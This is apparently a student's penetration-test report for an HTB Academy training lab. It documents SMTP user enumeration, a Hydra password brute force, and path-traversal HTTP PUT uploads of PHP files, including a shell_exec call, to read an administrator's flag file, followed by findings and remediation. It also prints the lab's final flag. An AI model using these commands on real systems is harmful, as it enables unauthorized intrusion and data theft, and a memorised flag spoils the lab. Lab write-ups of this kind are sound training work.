# HTB Academy — Attacking Common Services: Easy
## Full Penetration Testing Assessment Report

### Assessment Summary

| Item | Details |
|---|---|
| Organization | Inlanefreight |
| Assessment | Attacking Common Services - Easy |
| Target domain | `inlanefreight.htb` |
| Target IPs documented in the notes | `10.129.203.7` and `10.129.111.81` |
| Host | `WIN-EASY` |
| Objective | Retrieve `flag.txt` |
| Result | **Successful** |
| Final flag | `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}` |

> **Source basis:** This report is based on the uploaded assessment notes. The notes use `10.129.203.7` for the initial Nmap/SMTP enumeration and `10.129.111.81` for the later FTP/HTTPS exploitation. Both are preserved exactly rather than silently reconciled.

---

# 1. Executive Summary

The target was assessed as part of the authorized HTB Academy **Attacking Common Services - Easy** laboratory. The objective was to review the server configuration and demonstrate successful access by retrieving the contents of `flag.txt`.

The assessment began with Nmap service enumeration. The target exposed FTP, SMTP, HTTP, HTTPS, SMTP submission, MariaDB, and RDP.

SMTP recipient enumeration identified a valid account:

```text
fiona@inlanefreight.htb
```

A password attack against FTP recovered:

```text
fiona : 987654321
```

Authenticated FTP access then exposed:

```text
docs.txt
WebServersInfo.txt
```

`WebServersInfo.txt` disclosed the Core FTP installation directory and the Apache/XAMPP document root:

```text
C:\CoreFTP
C:\xampp\htdocs\
```

The Core FTP HTTPS service on TCP/443 initially failed with the default TLS negotiation. Explicit TLS 1.2 negotiation succeeded.

Authenticated HTTP `PUT` functionality was then validated. A PHP file was placed into the Apache web root using:

```text
../xampp/htdocs/
```

The uploaded PHP file executed successfully through Apache, proving server-side code execution.

The assessment ultimately identified the flag at:

```text
C:\Users\Administrator\Desktop\flag.txt
```

The final PHP file read the flag and returned:

```text
HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
```

## Attack chain

```text
Nmap
  ↓
SMTP user enumeration
  ↓
fiona@inlanefreight.htb
  ↓
FTP password attack
  ↓
fiona : 987654321
  ↓
Authenticated FTP
  ↓
Configuration disclosure
  ↓
Core FTP HTTPS
  ↓
Authenticated HTTP PUT
  ↓
Path traversal-style web-root placement
  ↓
PHP execution
  ↓
Flag path discovery
  ↓
flag.txt read
```

---

# 2. Scope and Objective

## Scope

Target domain:

```text
inlanefreight.htb
```

Target addresses documented in the supplied notes:

```text
10.129.203.7
10.129.111.81
```

## Objective

Retrieve:

```text
flag.txt
```

Expected proof-of-access format:

```text
HTB{...}
```

---

# 3. Methodology

The assessment followed:

1. Network and service discovery
2. Version and OS enumeration
3. SMTP user enumeration
4. Credential discovery
5. Authenticated FTP enumeration
6. Information disclosure analysis
7. HTTPS/TLS troubleshooting
8. Authenticated HTTP write testing
9. PHP upload and execution validation
10. Flag path discovery
11. Flag retrieval
12. Security-impact assessment

---

# 4. Initial Nmap Enumeration

Command:

```bash
nmap -v -sV -sC -O -T4 -A \
-oA /home/arjun/"Nmap Output"/easy \
10.129.203.7
```

## Discovered services

| Port | Service | Version / Product |
|---:|---|---|
| 21/tcp | FTP | Core FTP Server 2.0, build 725, 64-bit Unregistered |
| 25/tcp | SMTP | hMailServer smtpd |
| 80/tcp | HTTP | Apache 2.4.53, OpenSSL/1.1.1n, PHP/7.4.29 |
| 443/tcp | HTTPS | Core FTP HTTPS Server |
| 587/tcp | SMTP submission | hMailServer smtpd |
| 3306/tcp | MySQL/MariaDB | MariaDB 10.4.24 |
| 3389/tcp | RDP | Microsoft Terminal Services |

The host was identified as:

```text
WIN-EASY
```

Nmap's OS detection suggested a Windows Server 2019 / Windows family system.

---

# 5. Service Enumeration

## 5.1 FTP — TCP/21

Detected:

```text
Core FTP Server Version 2.0, build 725, 64-bit Unregistered
```

The TLS certificate also disclosed:

```text
CN=Test
emailAddress=fiona@inlanefreight.htb
```

This provided useful context for later account enumeration.

## 5.2 SMTP — TCP/25

Detected:

```text
hMailServer smtpd
```

Advertised authentication:

```text
AUTH LOGIN PLAIN
```

The service exposed recipient-related commands including:

```text
MAIL
RCPT
VRFY
```

This made SMTP user enumeration a logical next step.

## 5.3 HTTP — TCP/80

Detected:

```text
Apache httpd 2.4.53
(Win64) OpenSSL/1.1.1n PHP/7.4.29
```

The site identified itself as:

```text
Welcome to XAMPP
```

and redirected to:

```text
/dashboard/
```

## 5.4 HTTPS — TCP/443

Detected:

```text
Core FTP HTTPS Server
```

Unauthenticated access returned:

```text
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="Restricted Area"
```

## 5.5 SMTP Submission — TCP/587

Detected:

```text
hMailServer smtpd
```

with:

```text
AUTH LOGIN PLAIN
```

## 5.6 MariaDB — TCP/3306

Detected:

```text
MariaDB 5.5.5-10.4.24
```

Authentication plugin:

```text
mysql_native_password
```

No successful database authentication was documented.

## 5.7 RDP — TCP/3389

Detected:

```text
Microsoft Terminal Services
```

Host information:

```text
WIN-EASY
```

No successful RDP authentication was documented.

---

# 6. SMTP User Enumeration

The HTB-provided username list was used:

```bash
smtp-user-enum -M RCPT \
-U /home/arjun/Downloads/cyber/users.list \
-t 10.129.203.7 \
-D inlanefreight.htb
```

The scan tested:

```text
79 usernames
```

The valid result was:

```text
10.129.203.7: fiona@inlanefreight.htb exists
```

Therefore the valid account identified was:

```text
fiona@inlanefreight.htb
```

---

# 7. FTP Credential Discovery

The identified username was tested against FTP using Hydra:

```bash
hydra -l fiona \
-P /usr/share/wordlists/rockyou.txt \
-t 1 \
-v \
10.129.111.81 ftp
```

Hydra recovered:

```text
login: fiona
password: 987654321
```

Credential:

```text
fiona : 987654321
```

This was a weak, easily guessable password and enabled authenticated FTP access.

---

# 8. Authenticated FTP Enumeration

Connection:

```bash
ftp 10.129.111.81
```

Banner:

```text
220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
```

Authentication succeeded:

```text
331 password required for fiona
230-Logged on
```

The server reported:

```text
Remote system type is UNIX.
Using binary mode to transfer files.
```

The initial Extended Passive Mode data connection timed out:

```text
ftp: Can't connect to `10.129.111.81:40685':
Connection timed out
```

The FTP client then successfully used active mode:

```text
200 PORT command successful
150 Opening ASCII mode data connection
```

---

# 9. FTP File Discovery

The authenticated directory contained:

```text
-r-xr-xrwx 1 owner group 55  Apr 21 2022 docs.txt
-r-xr-xrwx 1 owner group 255 Apr 22 2022 WebServersInfo.txt
```

Both files were downloaded.

## `docs.txt`

```text
I'm testing the FTP using HTTPS, everything looks good.
```

## `WebServersInfo.txt`

```text
CoreFTP:
Directory C:\CoreFTP
Ports: 21 & 443
Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt

Apache
Directory "C:\xampp\htdocs\"
Ports: 80 & 4443
Test Command: curl http://localhost/test.php
```

### Security significance

This disclosed:

```text
Core FTP directory: C:\CoreFTP
Apache document root: C:\xampp\htdocs\
Core FTP ports: 21 and 443
Apache ports: 80 and 4443
```

The Apache document-root disclosure directly supported the later exploitation path.

---

# 10. HTTPS/TLS Troubleshooting

The initial HTTPS attempts failed with:

```text
TLS connect error:
unexpected eof while reading
```

An explicit TLS 1.2 connection was successful:

```bash
curl -vk --tlsv1.2 --tls-max 1.2 \
-H "Host: localhost" \
--basic -u 'fiona:987654321' \
https://10.129.111.81/docs.txt
```

The negotiated protocol was:

```text
TLSv1.2
```

Cipher:

```text
ECDHE-RSA-AES256-GCM-SHA384
```

The server certificate included:

```text
emailAddress=fiona@inlanefreight.htb
CN=Test
```

The authenticated request returned:

```text
HTTP/1.1 200 OK
Server: Core FTP HTTP Server
```

and the contents of `docs.txt`.

This confirmed working authenticated access to the Core FTP HTTPS interface.

---

# 11. HTTP PUT Validation

A harmless test file was created:

```bash
echo 'HTB-PUT-TEST' > /tmp/test.txt
```

It was uploaded with:

```bash
curl -vk --tlsv1.2 --tls-max 1.2 \
-X PUT \
-H "Host: localhost" \
--basic -u 'fiona:987654321' \
--data-binary @/tmp/test.txt \
--path-as-is \
https://10.129.111.81/docs.txt
```

The server returned:

```text
HTTP/1.1 200 Ok
Server: Core FTP HTTP Server
```

This demonstrated authenticated file-write capability through the HTTP interface.

---

# 12. PHP Upload and Path Traversal

A PHP test file was created:

```php
<?php
echo "HTB-PHP-WORKS";
?>
```

The file was uploaded using:

```bash
curl -k --tlsv1.2 --tls-max 1.2 \
-X PUT \
-H "Host: localhost" \
--basic -u 'fiona:987654321' \
--data-binary @/tmp/test.php \
--path-as-is \
'https://10.129.111.81/../xampp/htdocs/test.php'
```

The server returned:

```text
HTTP/1.1 200 Ok
Server: Core FTP HTTP Server
```

The path used:

```text
../xampp/htdocs/
```

allowed the uploaded file to be placed in the Apache/XAMPP web root.

---

# 13. PHP Execution Confirmation

The uploaded file was requested through Apache:

```bash
curl http://10.129.111.81/test.php
```

Output:

```text
HTB-PHP-WORKS
```

This proved:

- File write was successful.
- The file was placed in the web root.
- Apache served the file.
- PHP executed the uploaded code.

This converted authenticated file-write access into server-side code execution.

---

# 14. Flag Path Discovery

An initial attempt tried:

```php
<?php
echo file_get_contents('C:\\flag.txt');
?>
```

The server returned an error indicating:

```text
C:\flag.txt
```

did not exist.

A recursive search was then attempted:

```php
<?php
echo shell_exec('where /r C:\\ flag.txt 2>&1');
?>
```

The request exceeded the PHP execution limit:

```text
Maximum execution time of 120 seconds exceeded
```

The correct flag path was subsequently identified as:

```text
C:\Users\Administrator\Desktop\flag.txt
```

---

# 15. Final Flag Retrieval

The final PHP payload was:

```php
<?php
echo file_get_contents('C:\\Users\\Administrator\\Desktop\\flag.txt');
?>
```

It was uploaded using:

```bash
curl -k --tlsv1.2 --tls-max 1.2 \
-X PUT \
-H "Host: localhost" \
--basic -u 'fiona:987654321' \
--data-binary @/tmp/flag.php \
--path-as-is \
'https://10.129.111.81/../xampp/htdocs/flag.php'
```

The file was executed with:

```bash
curl http://10.129.111.81/flag.php
```

Response:

```text
HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
```

---

# 16. Security Findings

## Finding 1 — SMTP Username Enumeration

**Severity: Medium**

The SMTP service allowed a valid account to be identified:

```text
fiona@inlanefreight.htb
```

### Impact

Valid usernames can be used as the basis for password attacks.

### Recommendation

- Reduce distinguishable SMTP responses.
- Implement anti-enumeration controls.
- Monitor repeated RCPT probing.
- Apply appropriate SMTP authentication controls.

---

## Finding 2 — Weak Password

**Severity: High**

The recovered password was:

```text
987654321
```

### Impact

The weak password enabled FTP authentication.

### Recommendation

- Enforce strong passwords/passphrases.
- Reject common numeric passwords.
- Apply authentication throttling and monitoring.
- Rotate exposed credentials.

---

## Finding 3 — Sensitive Information Disclosure Through FTP

**Severity: Medium**

`WebServersInfo.txt` exposed:

```text
C:\CoreFTP
C:\xampp\htdocs\
```

and service/test information.

### Impact

The disclosure significantly reduced reconnaissance effort and directly revealed the web-root location.

### Recommendation

Remove internal infrastructure documentation from user-accessible FTP directories and apply least-privilege permissions.

---

## Finding 4 — Authenticated HTTP File Write

**Severity: Critical**

The Core FTP HTTPS service accepted authenticated HTTP `PUT` requests.

### Impact

Authenticated users could write files through the HTTP interface. Because the host also contained an executable PHP web root, this created a path from valid credentials to code execution.

### Recommendation

- Disable unnecessary HTTP write operations.
- Restrict uploads to dedicated non-executable directories.
- Separate FTP storage from web application directories.
- Apply strict authorization controls.

---

## Finding 5 — Path Traversal / Arbitrary File Placement

**Severity: Critical**

The assessment successfully used:

```text
../xampp/htdocs/
```

to place a PHP file in the Apache document root.

### Impact

This enabled an authenticated file-write primitive to reach an executable web directory.

### Recommendation

- Canonicalize paths before filesystem access.
- Reject traversal sequences.
- Constrain filesystem operations to a trusted root.
- Apply strict Windows ACLs.

---

## Finding 6 — Arbitrary PHP Code Execution

**Severity: Critical**

The uploaded PHP file executed successfully:

```text
HTB-PHP-WORKS
```

### Impact

Server-side PHP execution enabled access to files readable by the web process.

### Recommendation

- Prevent executable file uploads.
- Disable PHP execution in upload directories.
- Separate content storage from application code.
- Run services with minimum privileges.

---

## Finding 7 — Excessive Filesystem Access

**Severity: High**

The web-executed PHP process could read:

```text
C:\Users\Administrator\Desktop\flag.txt
```

### Impact

Equivalent permissions in a production environment could expose sensitive administrative files and data.

### Recommendation

- Restrict web-service filesystem permissions.
- Use a dedicated low-privilege service account.
- Apply Windows ACLs according to least privilege.
- Keep sensitive administrative data outside web-process-readable paths.

---

# 17. Overall Risk Assessment

The weaknesses formed a chained compromise:

```text
SMTP enumeration
      ↓
Valid user
      ↓
Weak password
      ↓
FTP authentication
      ↓
Sensitive configuration disclosure
      ↓
Core FTP HTTPS
      ↓
Authenticated HTTP PUT
      ↓
Path traversal
      ↓
PHP upload
      ↓
PHP execution
      ↓
Sensitive file read
      ↓
Full objective compromise
```

**Overall severity: Critical**

The critical severity is driven by the combination of authenticated file write, path traversal, executable PHP placement, and filesystem access.

---

# 18. Remediation Priorities

| Priority | Recommendation |
|---|---|
| P1 | Disable or tightly restrict Core FTP HTTP write functionality |
| P1 | Fix path traversal and enforce canonical path validation |
| P1 | Prevent uploaded files from executing as PHP |
| P1 | Rotate Fiona's weak password |
| P1 | Enforce a strong password policy |
| P1 | Restrict web-service filesystem permissions |
| P2 | Remove sensitive server configuration files from FTP-accessible locations |
| P2 | Reduce SMTP user enumeration |
| P2 | Restrict FTP access to authorized networks/users |
| P3 | Review MariaDB, RDP, SMTP submission, HTTP, and HTTPS exposure |

---

# 19. Complete Command Reference

## Nmap

```bash
nmap -v -sV -sC -O -T4 -A \
-oA /home/arjun/"Nmap Output"/easy \
10.129.203.7
```

## SMTP enumeration

```bash
smtp-user-enum -M RCPT \
-U /home/arjun/Downloads/cyber/users.list \
-t 10.129.203.7 \
-D inlanefreight.htb
```

## FTP password attack

```bash
hydra -l fiona \
-P /usr/share/wordlists/rockyou.txt \
-t 1 \
-v \
10.129.111.81 ftp
```

## FTP access

```bash
ftp 10.129.111.81
```

## FTP enumeration

```text
ls
get docs.txt
get WebServersInfo.txt
```

## HTTPS validation

```bash
curl -vk --tlsv1.2 --tls-max 1.2 \
-H "Host: localhost" \
--basic -u 'fiona:987654321' \
https://10.129.111.81/docs.txt
```

## HTTP PUT validation

```bash
echo 'HTB-PUT-TEST' > /tmp/test.txt

curl -vk --tlsv1.2 --tls-max 1.2 \
-X PUT \
-H "Host: localhost" \
--basic -u 'fiona:987654321' \
--data-binary @/tmp/test.txt \
--path-as-is \
https://10.129.111.81/docs.txt
```

## PHP execution test

```php
<?php
echo "HTB-PHP-WORKS";
?>
```

## Upload PHP test

```bash
curl -k --tlsv1.2 --tls-max 1.2 \
-X PUT \
-H "Host: localhost" \
--basic -u 'fiona:987654321' \
--data-binary @/tmp/test.php \
--path-as-is \
'https://10.129.111.81/../xampp/htdocs/test.php'
```

## Verify PHP

```bash
curl http://10.129.111.81/test.php
```

## Initial flag-path test

```php
<?php
echo file_get_contents('C:\\flag.txt');
?>
```

## Flag search attempt

```php
<?php
echo shell_exec('where /r C:\\ flag.txt 2>&1');
?>
```

## Final flag reader

```php
<?php
echo file_get_contents('C:\\Users\\Administrator\\Desktop\\flag.txt');
?>
```

## Retrieve flag

```bash
curl http://10.129.111.81/flag.php
```

---

# 20. Final Evidence

Command:

```bash
curl http://10.129.111.81/flag.php
```

Response:

```text
HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
```

## Final Flag

```text
HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
```

---

# 21. Conclusion

The Easy assessment achieved the intended objective and demonstrated a complete attack chain against the target.

The compromise relied on several weaknesses working together:

```text
SMTP user enumeration
        ↓
Weak credentials
        ↓
Authenticated FTP
        ↓
Sensitive configuration disclosure
        ↓
Authenticated Core FTP HTTPS
        ↓
HTTP file write
        ↓
Path traversal
        ↓
PHP execution
        ↓
Sensitive file access
        ↓
Flag retrieval
```

The final flag was successfully retrieved from:

```text
C:\Users\Administrator\Desktop\flag.txt
```

and was:

```text
HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
```

The highest-priority remediation is to eliminate the authenticated file-write-to-code-execution path, enforce strong credentials, restrict filesystem permissions, remove sensitive configuration information from FTP-accessible locations, and reduce unnecessary exposed services.
